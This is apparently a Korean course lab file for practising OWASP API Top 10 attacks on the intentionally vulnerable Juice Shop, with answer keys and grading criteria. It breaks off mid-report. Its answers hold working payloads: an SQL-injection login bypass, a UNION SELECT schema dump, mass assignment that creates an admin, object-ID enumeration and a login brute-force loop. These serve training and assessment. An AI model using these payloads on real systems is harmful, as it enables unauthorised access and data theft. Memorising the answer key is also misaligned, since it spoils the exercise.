lab_id: web-vuln-nonai-week12
title: API 보안 취약점 실습
version: non-ai
course: web-vuln-nonai
week: 12
description: JuiceShop의 REST API를 대상으로 인증 우회, 과도한 데이터 노출, Mass Assignment, Rate Limiting
  부재 등 OWASP API Top 10 취약점을 실습합니다.
difficulty: hard
duration_minutes: 120
objectives:
- OWASP API Security Top 10 취약점을 이해한다
- API 인증/인가 취약점을 탐지하고 공격한다
- API Rate Limiting, 데이터 노출 등 설계 취약점을 분석한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를
    탐색하라.
  hint: curl로 /api/Products, /api/Users, /api/Feedbacks, /api/Challenges, /api/Recycles,
    /rest/products/search, /rest/user/login 등을 순차적으로 요청하세요.
  category: recon
  points: 8
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products
    api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search
    rest/user/login rest/track-order; do echo -n "/$EP: " && curl -s -o /dev/null
    -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''''; done
    && echo ''=== API Mapping Complete ==='''
  answer_detail: API 엔드포인트 매핑은 API 보안 테스트의 기초입니다. 200(접근 가능), 401(인증 필요), 403(권한 부족),
    404(미존재) 응답을 구분하여 공격 표면을 파악합니다. 인증 없이 200이 반환되는 엔드포인트가 첫 번째 공격 대상입니다.
  verify:
    type: output_contains
    expect: API Mapping Complete
    field: stdout
    semantic:
      intent: API 엔드포인트 매핑 — for EP in api/Products api/Users api/Feedbacks api/Challenges
        rest/user/login; curl + HTTP 코드. 200/401/403/404 분류. 인증 없이 200 = 첫 공격 대상.
        OWASP API2023 API1.
      success_criteria:
      - API Mapping Complete 키워드
      - 다중 엔드포인트 (6개 이상)
      - HTTP 코드 분류
      acceptable_methods:
      - for 루프 + curl
      - Burp Spider/Crawler
      - OWASP ZAP API scan
      negative_signs:
      - 엔드포인트 3개 이하
      - HTTP 분류 없음
      - 단순 GET
  target_vm: attacker
- order: 2
  instruction: 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive
    Data Exposure)을 확인하라.
  hint: 인증 토큰 없이 curl http://{{WEB_IP}}:3000/api/Users/ 를 요청하세요. 응답에 패스워드 해시, 이메일
    등 민감 정보가 포함되는지 확인합니다.
  category: exploit
  points: 12
  answer: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json;
    data=json.load(sys.stdin).get(''data'',[]); [print(f''User {u.get(\"id\")}: email={u.get(\"email\")},
    role={u.get(\"role\",\"N/A\")}'') for u in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/
    | head -c 500'
  answer_detail: 'OWASP API #3 Excessive Data Exposure: API가 클라이언트가 필요한 것보다 많은 데이터를
    반환합니다. 사용자 이메일, 패스워드 해시, createdAt 등의 민감 정보가 필터링 없이 노출되면, 공격자가 이를 크리덴셜 스터핑이나 소셜
    엔지니어링에 활용할 수 있습니다.'
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: Excessive Data Exposure — curl /api/Users | jq id/email/role 추출. OWASP
        API2023 API3. 클라이언트 필요 대비 과다 필드 반환. 패스워드 해시/이메일 노출. 크리덴셜 스터핑 / 소셜 엔지니어링.
      success_criteria:
      - email 키워드
      - /api/Users/ 응답 분석
      - 민감 정보 노출
      acceptable_methods:
      - curl + jq
      - Burp 응답 분석
      - autorize Burp 확장
      negative_signs:
      - 응답 분석 없음
      - 필드 한계 맥락 없음
      - 단순 GET
  target_vm: attacker
- order: 3
  instruction: Broken Object Level Authorization(BOLA) 취약점을 테스트하시오. 인증된 사용자 토큰으로 다른
    사용자의 장바구니(/rest/basket/1, /rest/basket/2)에 접근하라.
  hint: SQL Injection으로 로그인한 후, Authorization 헤더로 다른 ID의 basket에 접근하세요.
  category: exploit
  points: 12
  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
    | cut -d''"'' -f4) && for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i
    -H "Authorization: Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo
    ''''; done'
  answer_detail: 'OWASP API #1 BOLA: API가 객체 수준의 권한 확인을 하지 않아, 다른 사용자의 리소스에 접근할 수
    있습니다. basket/1, basket/2처럼 순차적 ID를 열거하면 모든 사용자의 장바구니를 조회할 수 있습니다.'
  verify:
    type: output_contains
    expect: Basket
    field: stdout
    semantic:
      intent: BOLA — /rest/basket/1, 2, 3 순차 접근 with JWT. OWASP API2023 API1. 객체 수준
        권한 확인 누락. 순차 ID 열거 → 타 사용자 리소스. 가장 흔한 API 취약점.
      success_criteria:
      - Basket 키워드
      - 여러 ID 순차 접근
      - Authorization Bearer
      acceptable_methods:
      - 수동 ID 변경
      - Burp Intruder Sequencer
      - autorize 자동
      negative_signs:
      - 단일 ID
      - 인증 토큰 없음
      - BOLA 맥락 없음
  target_vm: attacker
- order: 4
  instruction: Mass Assignment 공격을 수행하시오. 사용자 등록 API(/api/Users/)에 role과 isAdmin 필드를
    추가하여 관리자 계정을 생성하라.
  hint: POST /api/Users/ 에 {"email":"hacker@test.com","password":"test1234","role":"admin","isAdmin":true}
    형태로 요청하세요.
  category: exploit
  points: 12
  answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\"\
    :\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}'\
    \ \\\n | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{});\
    \ print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\
    \"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null\
    \ || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json'\
    \ -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\"\
    :\"hack1234\",\"role\":\"admin\"}'"
  answer_detail: 'OWASP API #6 Mass Assignment: 서버가 클라이언트 요청의 모든 필드를 그대로 모델에 바인딩하면,
    공격자가 role, isAdmin 같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다.'
  verify:
    type: output_contains
    expect:
    - email
    - admin
    field: stdout
    semantic:
      intent: Mass Assignment — POST /api/Users/ + role:admin, isAdmin:true 필드 추가.
        OWASP API2023 API6. 서버가 모든 필드 모델 바인딩 시 권한 상승. 응답 role:admin 반영 = 취약.
      success_criteria:
      - email 키워드
      - role/isAdmin 필드 주입
      - Mass Assignment 페이로드
      acceptable_methods:
      - JSON 필드 확장
      - ORM fillable 우회
      - Snyk Mass Assignment 검증
      negative_signs:
      - role 필드 없음
      - 단순 등록
      - 권한 상승 맥락 없음
  target_vm: attacker
- order: 5
  instruction: Rate Limiting 부재를 확인하시오. 로그인 API에 잘못된 비밀번호로 20회 연속 요청을 보내 계정 잠금이나 속도
    제한이 있는지 테스트하라.
  hint: for 루프로 curl -X POST /rest/user/login 에 잘못된 비밀번호를 반복 전송하세요.
  category: exploit
  points: 10
  answer: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20);
    do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}'' && echo '''';
    done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
  answer_detail: 'OWASP API #4 Lack of Resources & Rate Limiting: Rate Limiting이 없으면
    브루트포스, 크리덴셜 스터핑 공격이 가능합니다. 20회 시도 후에도 429(Too Many Requests)가 발생하지 않으면 취약합니다.'
  verify:
    type: output_contains
    expect:
    - Rate Limit Test Complete
    - '200'
    field: stdout
    semantic:
      intent: Rate Limiting — for $(seq 1 20); curl POST /rest/user/login 잘못된 비번 반복.
        429 없음 = 취약. OWASP API2023 API4 Unrestricted Resource Consumption. 브루트포스/크리덴셜
        스터핑 가능.
      success_criteria:
      - Rate Limit Test Complete 키워드
      - 20회 반복
      - 429 또는 차단 없음
      acceptable_methods:
      - for 루프 + curl
      - Burp Intruder Sniper
      - hydra 자동
      negative_signs:
      - 반복 5회 이하
      - 단일 시도
      - 429 검증 없음
  target_vm: attacker
- order: 6
  instruction: Broken Function Level Authorization을 테스트하시오. 인증된 사용자 토큰으로 관리자 전용 HTTP
    메서드(PUT, DELETE)에 접근하라.
  hint: curl -X GET/PUT/DELETE /api/Products/1 으로 각 메서드를 테스트하세요.
  category: exploit
  points: 12
  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
    | cut -d''"'' -f4) && echo ''=== Function Level Auth Test ==='' && for METHOD
    in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1: " && curl -s -o
    /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
    -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo
    ''''; done && echo ''=== Auth Test Complete ==='''
  answer_detail: 'OWASP API #5 Broken Function Level Authorization: 서버가 HTTP 메서드별로
    권한을 구분하지 않으면, GET은 허용하지만 PUT/DELETE도 허용될 수 있습니다. 관리자 전용 기능(사용자 수정/삭제)에 일반 사용자가
    접근 가능하면 심각한 취약점입니다.'
  verify:
    type: output_contains
    expect: Auth Test Complete
    field: stdout
    semantic:
      intent: BFLA — for METHOD in GET PUT DELETE OPTIONS; curl -X $METHOD /api/Products/1.
        OWASP API2023 API5. HTTP 메서드별 권한 구분 없음. 관리자 전용 PUT/DELETE에 일반 사용자 접근.
      success_criteria:
      - Auth Test Complete 키워드
      - 4 메서드 이상 (GET/PUT/DELETE/OPTIONS)
      - 각 HTTP 코드
      acceptable_methods:
      - 수동 METHOD 변경
      - autorize 확장
      - fuzz method
      negative_signs:
      - 메서드 1개
      - 단순 GET
      - BFLA 맥락 없음
  target_vm: attacker
- order: 7
  instruction: SQL Injection을 통한 API 데이터 탈취를 수행하시오. /rest/products/search 엔드포인트에서
    UNION SELECT로 데이터베이스 스키마를 추출하라.
  hint: q 파라미터에 test'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master-- 형태의 페이로드를
    넣으세요.
  category: exploit
  points: 12
  answer: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--'
    | head -c 500
  answer_detail: JuiceShop의 검색 API는 SQLite를 사용하며, 입력 검증이 없어 UNION SELECT로 다른 테이블의
    데이터를 추출할 수 있습니다. sqlite_master 테이블에서 전체 스키마를 조회하면 Users, Cards 등의 민감 테이블 구조가 노출됩니다.
  verify:
    type: output_contains
    expect: data
    field: stdout
    semantic:
      intent: SQLi 통한 API 데이터 탈취 — /rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master.
        SQLite 스키마 탈취. Users/Cards 테이블 구조 노출. OWASP A03 + CWE-89.
      success_criteria:
      - data 키워드 또는 sqlite_master
      - UNION SELECT + sql 컬럼
      - 9컬럼 매칭
      acceptable_methods:
      - 수동 UNION
      - sqlmap --tables
      - Burp Intruder column count
      negative_signs:
      - UNION 없음
      - 컬럼 불일치
      - 메타 테이블 누락
  target_vm: attacker
- order: 8
  instruction: API 응답 보안 헤더를 분석하시오. CORS 설정, X-Content-Type-Options, Cache-Control
    등이 올바르게 설정되어 있는지 확인하라.
  hint: curl -I로 API 응답 헤더를 확인하세요. Access-Control-Allow-Origin이 *이면 모든 도메인에서 접근 가능합니다.
  category: defense
  points: 8
  answer: 'echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/
    | grep -iE ''(access-control|x-content|cache-control|x-frame|strict-transport|content-security)''
    && echo ''=== CORS Preflight ==='' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/
    -H ''Origin: http://evil.com'' -H ''Access-Control-Request-Method: DELETE'' |
    grep -iE ''(access-control|allow)'' && echo ''=== Header Analysis Complete ==='''
  answer_detail: 'Access-Control-Allow-Origin: *는 모든 도메인에서 API를 호출할 수 있어 CSRF에 취약합니다.
    Cache-Control: no-store가 없으면 민감 데이터가 캐시됩니다. CORS는 허용 도메인을 명시적으로 지정해야 합니다.'
  verify:
    type: output_contains
    expect:
    - Header Analysis Complete
    - headers
    field: stdout
    semantic:
      intent: API 보안 헤더 — curl -sI + grep access-control|x-content|cache-control|x-frame|HSTS|CSP
        + CORS preflight OPTIONS. ACAO:* + credentials 불일치. OWASP Secure Headers +
        CWE-942.
      success_criteria:
      - Header Analysis Complete 키워드
      - CORS + 보안 헤더 3종 이상
      - preflight OPTIONS
      acceptable_methods:
      - curl + grep 헤더
      - securityheaders.com
      - Mozilla Observatory
      negative_signs:
      - 헤더 분석 없음
      - CORS 누락
      - preflight 미점검
  target_vm: attacker
- order: 9
  instruction: Swagger/OpenAPI 문서 노출 여부를 확인하시오. /api-docs, /swagger.json, /graphql
    등의 문서 엔드포인트를 탐색하라.
  hint: curl로 각 경로에 접근하여 200 응답이 오는지 확인하세요.
  category: recon
  points: 8
  answer: 'echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json
    /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl
    -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000$PATH 2>/dev/null);
    echo "$PATH: $CODE"; done && echo ''=== Doc Scan Complete ==='''
  answer_detail: API 문서(Swagger/OpenAPI)가 프로덕션에서 노출되면 모든 엔드포인트, 파라미터, 인증 방법이 공격자에게
    노출됩니다. GraphQL introspection이 활성화되면 전체 스키마가 노출됩니다. 프로덕션에서는 반드시 비활성화해야 합니다.
  verify:
    type: output_contains
    expect: Doc Scan Complete
    field: stdout
    semantic:
      intent: Swagger/OpenAPI 노출 — curl /api-docs, /swagger.json, /graphql, /.well-known/openapi.json,
        /v2/api-docs. 문서 노출 = 전체 엔드포인트/파라미터/인증 노출. GraphQL introspection. 프로덕션 비활성화.
        OWASP A05.
      success_criteria:
      - Doc Scan Complete 키워드
      - 다중 문서 경로 (5개 이상)
      - 응답 코드 확인
      acceptable_methods:
      - for + curl
      - kiterunner API 스캔
      - GraphQL introspection 쿼리
      negative_signs:
      - 경로 2개 이하
      - 단순 GET
      - 프로덕션 맥락 없음
  target_vm: attacker
- order: 10
  instruction: API 보안 종합 평가를 수행하시오. 발견된 OWASP API Top 10 취약점을 정리하고, 위험도를 평가하라.
  hint: BOLA, Excessive Data Exposure, Mass Assignment, Rate Limiting 부재 등을 종합 정리하세요.
  category: reporting
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): cat > /tmp/api_report.txt << ''EOF''

    === API 보안 종합 평가 보고서 ===

    대상: JuiceShop API (10.20.30.80:3000)


    [CRITICAL]

    A1-BOLA: /rest/basket/{id} 열거로 타 사용자 장바구니 접근

    A3-SQLi: /rest/products/search UNION SELECT로 DB 스키마 탈취


    [HIGH]

